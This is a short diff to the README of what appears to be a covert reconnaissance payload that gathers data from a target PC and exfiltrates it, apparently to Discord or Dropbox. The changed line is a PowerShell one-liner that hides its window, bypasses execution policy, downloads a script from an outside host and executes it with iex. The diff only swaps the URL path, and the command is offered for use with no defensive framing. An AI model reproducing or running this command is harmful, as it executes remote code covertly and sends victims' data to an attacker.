@@ -67,7 +67,7 @@ This program enumerates a target PC to collect as much recon data as possible fo
 Fill in either or both of these two methods to exfil your collected data
 
 ```
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/aucrjmf | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
